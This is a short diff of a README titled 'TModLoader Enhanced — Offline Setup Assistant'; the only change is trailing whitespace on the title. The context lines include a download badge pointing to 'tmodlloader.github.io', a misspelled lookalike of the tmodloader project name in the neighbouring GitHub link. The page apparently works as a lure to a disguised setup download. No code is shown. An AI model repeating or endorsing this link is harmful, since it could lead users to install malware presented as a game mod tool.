@@ -1,4 +1,4 @@
-# TModLoader Enhanced — Offline Setup Assistant
+# TModLoader Enhanced — Offline Setup Assistant 
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://tmodlloader.github.io/.github/)
 [![Version](https://img.shields.io/badge/Version-1.4.4-green)](https://github.com/tmodloader/tmodloader)
